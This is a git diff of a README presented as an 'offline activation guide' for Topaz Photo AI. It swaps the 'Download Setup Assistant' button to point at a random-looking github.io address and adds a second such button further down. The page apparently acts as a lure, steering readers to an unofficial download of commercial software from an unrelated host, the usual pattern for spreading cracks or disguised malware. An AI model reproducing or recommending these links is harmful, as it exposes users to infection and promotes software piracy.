@@ -1,6 +1,6 @@
 # Topaz Photo AI — Offline Activation Guide
 
-[![💾 Download Setup Assistant](https://img.shields.io/badge/%F0%9F%92%BE-Download_Setup_Assistant-%232993D1?style=for-the-badge&logo=topazlabs)](https://topaz-photo-ai-download.github.io/.github)
+[![💾 Download Setup Assistant](https://img.shields.io/badge/%F0%9F%92%BE-Download_Setup_Assistant-%232993D1?style=for-the-badge&logo=topazlabs)](https://ryadikmntiiks.github.io/.github/Topoa)
 
 ---
 
@@ -34,6 +34,8 @@
 
 ![Before/After Example](https://th.bing.com/th/id/OIP.lH1zxkMwtUwLUCHdwP4tMgHaEU?rs=1&pid=ImgDetMain&cb=idpwebpc2)  
 *Visual difference after enhancement — improved clarity and detail*
+
+[![💾 Download Setup Assistant](https://img.shields.io/badge/%F0%9F%92%BE-Download_Setup_Assistant-%232993D1?style=for-the-badge&logo=topazlabs)](https://ryadikmntiiks.github.io/.github/Topoa)
 
 ---
 
